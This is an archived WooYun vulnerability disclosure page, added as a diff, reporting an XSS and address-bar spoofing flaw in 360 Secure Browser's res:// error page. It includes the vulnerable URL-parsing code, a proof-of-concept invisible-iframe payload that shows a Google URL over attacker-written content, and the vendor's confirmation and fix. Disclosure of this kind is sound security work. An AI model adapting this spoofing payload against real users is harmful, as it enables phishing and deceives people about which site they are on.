@@ -1,0 +1,215 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		360浏览器欺诈漏洞（360安全漏洞序列之一）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		360浏览器欺诈漏洞（360安全漏洞序列之一）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/唐尸三摆手">唐尸三摆手</a> 
+</li><li>提交时间：		2012-10-14 23:00</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-10-14：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-10-15：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-10-18：	细节向第三方安全合作伙伴开放<br/>
+									2012-10-25：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-11-04：	细节向普通白帽子公开<br/>
+									2012-11-24：	细节向实习白帽子公开<br/>
+									2012-11-28：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">最近360很火啊，又看到微博上乌云发的那个安全问题被水军猛喷，喷乌云就算了，可是某些言论把哥也惹到了，哥毕竟也是那个@360安扬 所骂的 搞web安全的，不懂客户端安全的人里的一个..... 之前报告360的安全问题人家补了感谢都没一个，软件基本都是不完美的，有点漏洞很正常，好好讨论就是，喷就不对了，俺这几天就接着看看到底不懂客户端的人能搞点什么漏洞出来。<br />
+<br />
+360安全浏览器中存在一个安全问题，可以诱导用户访问任意域名但是攻击者可以控制其中的内容，url看起来可信，但是实际上内容却可以是黑客构造的，形成钓鱼欺诈漏洞。<br />
+</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail"></p><pre><code>_parse_url: function () {<br />
+            var tmp = this._error_url.split(&#039;/&#039;);<br />
+            this._error_domain = tmp[2];<br />
+            var regexp = /([^#\?&amp;=]+)=([^#\?&amp;=]+)/gi;<br />
+            this._error_url_args = {};<br />
+            var result = null;<br />
+            while (result = regexp.exec(tmp[3])) {<br />
+                //try{<br />
+                //    this._error_url_args[ result[1] ] = decodeURIComponent(result[2]);<br />
+                //}catch(e){<br />
+                this._error_url_args[result[1]] = result[2];<br />
+                //}<br />
+            }<br />
+        }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+访问出错时的一段逻辑<br />
+<br />
+<br />
+<br />
+</p><pre><code>Event.bind($(&#039;#button_refresh&#039;), &#039;click&#039;, function (e) {<br />
+                Stats.add(5); // 5. 点击刷新按钮次数<br />
+                e.preventDefault();<br />
+                window.location = Error.info._error_url;<br />
+            });</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+跨站了，可信域的一个跨站，那么利用下吧<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;style&gt;<br />
+body { margin:0; padding:0 }<br />
+#top { width:100%; height:500px; background:#ffffff; position: absolute; }<br />
+#top input { position: absolute; top:0px; left:0px }<br />
+iframe { z-index:1000; position:absolute; filter:alpha(opacity=0); left:-131px; top:-167px }<br />
+&lt;/style&gt;<br />
+&lt;div id=&quot;top&quot;&gt;&lt;input type=&quot;button&quot; value=&quot;Google&quot; /&gt;&lt;/div&gt;<br />
+&lt;iframe width=&quot;600&quot; height=&quot;500&quot; src=&quot;res://c:%5cprogra~1%5c360%5c360se%5cpages%5cpages.dll/NAVIERR.HTM#500#javascript:alert(location);x=window.open(&#039;res://c:%255cprogra~1%255c360%255c360se%255cpages%255cpages.dll/NAVIERR.HTM%23500%23https://www.google.com&#039;);x.document.write(&#039;&lt;title&gt;Google&lt;/title&gt;i am wooyun&#039;);//&amp;x=w&quot;&gt;&lt;/iframe&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+在360自身的资源文件中存在一个xss漏洞，不过该漏洞却发生在res的360信任域，该文件还实现了其他的譬如修改url显示等逻辑，利用这个漏洞就可以实现对任意url的修改但是又可以控制url里的内容 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/14230012c4bbf27cb95b4000644033d1f22fe490.gif" target="_blank"><img src="../images/14230012c4bbf27cb95b4000644033d1f22fe490.gif" alt="" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">360的安扬肯定懂 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/唐尸三摆手" title="唐尸三摆手">唐尸三摆手</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-013359" title="360浏览器欺诈漏洞（360安全漏洞序列之一）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2012-10-15 14:46</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">漏洞原因：浏览器对网页输入未作校验，直接将形式“res:// 资源文件路径名/NAVIERR.HTML#XXXX#YYYYYYYYY”的地址显示为“YYYYYYYYY”。导致地址栏显示的URL与页面不符，形成钓鱼欺诈漏洞。<br />
+<br />
+感谢您的反馈，我们已经修复该漏洞，并会尽快发布新版本。您在方便的时候可以再Review下我们的新版本,thx<br />
+</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="13359";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
